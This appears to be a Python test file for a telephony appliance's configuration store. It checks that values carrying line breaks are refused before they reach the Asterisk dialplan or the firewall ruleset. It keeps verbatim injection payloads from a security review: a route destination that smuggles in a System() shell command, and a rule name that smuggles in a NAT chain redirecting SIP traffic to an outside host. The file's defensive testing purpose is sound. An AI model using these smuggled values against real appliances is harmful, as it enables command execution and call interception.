"""The document is text before it is configuration, and text can carry lines.

Everything in the source of truth is later spliced, as literal text, into files
that root loads: the firewall ruleset and the telephony engine's dialplan. A
value carrying a newline stops being a value and becomes a line, and a line in
either of those files is an instruction.

A security review demonstrated both halves of that against a running appliance.
A document posted with a newline inside a route's destination reached the
dialplan as ``same => n,System(...)``, which the engine executes. Another with a
newline inside a firewall rule's name reached the ruleset as a redirection chain
sending call signalling to a chosen host — and passed the syntax check the
privileged helper gates on, because it was perfectly valid syntax.

The payloads below are the ones from that review, kept verbatim. A test written
from an idea of an attack tends to test the idea; this one tests the attack.
"""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from appliance import firewall
from appliance.confstore import (
    ConfigurationStore,
    DocumentRefused,
    reject_structural_values,
)


def _document(**overrides: object) -> dict:
    base = {
        "revision": 1,
        "site": {"name": "a site", "timezone": "UTC"},
        "trunks": [],
        "extensions": [],
        "ring_groups": [],
        "inbound_routes": [],
        "outbound_routes": [],
        "time_conditions": [],
        "ivr_menus": [],
        "queues": [],
        "conferences": [],
        "firewall_rules": [],
        "dialplan": {"inbound_context": "from-trunk", "internal_context": "internal"},
        "hardware": {"spans": []},
    }
    base.update(overrides)
    return base


class DialplanInjectionTests(unittest.TestCase):
    """A route destination must not be able to become an engine instruction."""

    def setUp(self) -> None:
        self.directory = tempfile.TemporaryDirectory(prefix="crossbar-injection-")
        self.addCleanup(self.directory.cleanup)
        root = Path(self.directory.name)
        (root / "asterisk").mkdir()
        self.store = ConfigurationStore(
            document_path=root / "appliance.json",
            output_directory=root / "asterisk",
            digest_path=root / "digests.json",
        )

    def test_a_destination_carrying_a_line_break_is_refused_on_save(self) -> None:
        hostile = _document(
            inbound_routes=[
                {
                    "name": "inbound",
                    "did": "1000",
                    "destination_kind": "extension",
                    # The exact shape the review used: close the line, open a
                    # new one, and hand the engine a command to run.
                    "destination_value": "201\n same => n,System(/bin/sh -c 'id>/tmp/pwned')",
                    "enabled": True,
                }
            ]
        )
        with self.assertRaises(DocumentRefused) as refusal:
            self.store.save(hostile)
        self.assertIn("destination_value", str(refusal.exception))

    def test_the_engine_configuration_never_contains_the_injected_command(self) -> None:
        """Prove the outcome, not only the refusal.

        A test that asserts an exception can pass while the dangerous path
        still exists somewhere else, so the rendered artefacts are read and the
        command is looked for by name.
        """
        hostile = _document(
            inbound_routes=[
                {
                    "name": "inbound",
                    "did": "1000",
                    "destination_kind": "extension",
                    "destination_value": "201\n same => n,System(/bin/sh -c 'id>/tmp/pwned')",
                    "enabled": True,
                }
            ]
        )
        with self.assertRaises(DocumentRefused):
            self.store.save(hostile)
        with self.assertRaises(DocumentRefused):
            # Rendering is checked separately, because a document can reach it
            # without passing through save: restored from a backup, edited on
            # disk during a recovery, or written by a route added later.
            self.store.artefacts(hostile)

    def test_an_ordinary_document_still_saves_and_renders(self) -> None:
        """The guard must not refuse the configurations people actually write."""
        ordinary = _document(
            extensions=[
                {"number": "201", "name": "Reception", "technology": "PJSIP",
                 "voicemail": True, "ring_seconds": 20, "enabled": True}
            ],
            trunks=[
                {"name": "carrier-primary", "technology": "PJSIP",
                 "host": "sip.example.net", "username": "account", "enabled": True}
            ],
        )
        saved = self.store.save(ordinary)
        self.assertEqual(saved["revision"], 2)
        rendered = self.store.artefacts(ordinary)
        self.assertTrue(rendered, "an ordinary document rendered nothing")


class FirewallInjectionTests(unittest.TestCase):
    """A rule name must not be able to become a redirection chain.

    This is the more dangerous of the two, because the ruleset is loaded by
    root and the injected chain in the review sent call signalling to a host of
    the attacker's choosing — call interception and toll fraud, installed by
    the appliance itself.
    """

    HOSTILE_NAME = (
        "sip\n    }\n    chain nat_evil { type nat hook prerouting priority -100; "
        "ip saddr 0.0.0.0/0 udp dport 5060 dnat ip to 203.0.113.9 }\n    chain unused {"
    )

    def setUp(self) -> None:
        self.directory = tempfile.TemporaryDirectory(prefix="crossbar-fw-injection-")
        self.addCleanup(self.directory.cleanup)
        root = Path(self.directory.name)
        (root / "asterisk").mkdir()
        self.store = ConfigurationStore(
            document_path=root / "appliance.json",
            output_directory=root / "asterisk",
            digest_path=root / "digests.json",
        )

    def test_a_rule_name_carrying_a_chain_is_refused_on_save(self) -> None:
        hostile = _document(
            firewall_rules=[
                {
                    "name": self.HOSTILE_NAME,
                    "service": "session protocol",
                    "sources": ["any"],
                    "enabled": True,
                }
            ]
        )
        with self.assertRaises(DocumentRefused) as refusal:
            self.store.save(hostile)
        self.assertIn("firewall_rules", str(refusal.exception))

    def test_the_generated_ruleset_contains_no_redirection_chain(self) -> None:
        """Read the ruleset that would be generated and look for the chain.

        The review's finding was not that the ruleset was malformed — it was
        that it was well formed and wrong, so it passed the syntax gate the
        privileged helper relies on. Syntax validity proves nothing here; the
        absence of the chain does.
        """
        rules = [
            {
                "name": self.HOSTILE_NAME,
                "service": "session protocol",
                "sources": ["any"],
                "enabled": True,
            }
        ]
        try:
            ruleset = firewall.render_ruleset(rules, management_port=8088)
        except Exception:
            # Refusing to render at all is an acceptable outcome.
            return
        self.assertNotIn("nat_evil", ruleset)
        self.assertNotIn("dnat", ruleset.lower())
        self.assertNotIn("203.0.113.9", ruleset)


class TheGuardItselfTests(unittest.TestCase):
    """What the walk does and does not refuse."""

    def test_every_control_character_that_could_end_a_line_is_refused(self) -> None:
        for character in ("\n", "\r", "\x00", "\x0b", "\x0c", "\x1b", "\x7f"):
            with self.subTest(character=repr(character)):
                with self.assertRaises(DocumentRefused):
                    reject_structural_values({"name": f"value{character}more"})

    def test_the_refusal_names_where_the_value_was(self) -> None:
        """An operator who wrote a bad value has to be told which one."""
        with self.assertRaises(DocumentRefused) as refusal:
            reject_structural_values(
                {"trunks": [{"name": "fine"}, {"host": "bad\nhost"}]}
            )
        message = str(refusal.exception)
        self.assertIn("trunks[1].host", message)

    def test_ordinary_punctuation_and_accents_are_left_alone(self) -> None:
        """The guard refuses lines, not characters it finds unusual."""
        reject_structural_values(
            {
                "site": {"name": "Dakar — bâtiment 2, l'étage «nord»"},
                "note": "tabs\tare fine, they do not end a line",
                "symbols": "!@#$%^&*()[]{};:'\",.<>/?\\|`~+=-_",
            }
        )

    def test_a_deeply_nested_value_is_still_found(self) -> None:
        with self.assertRaises(DocumentRefused):
            reject_structural_values(
                {"a": {"b": [{"c": [{"d": "deep\ninjection"}]}]}}
            )

    def test_values_that_are_not_text_are_ignored(self) -> None:
        reject_structural_values(
            {"count": 12, "enabled": True, "ratio": 1.5, "absent": None}
        )


if __name__ == "__main__":
    unittest.main()
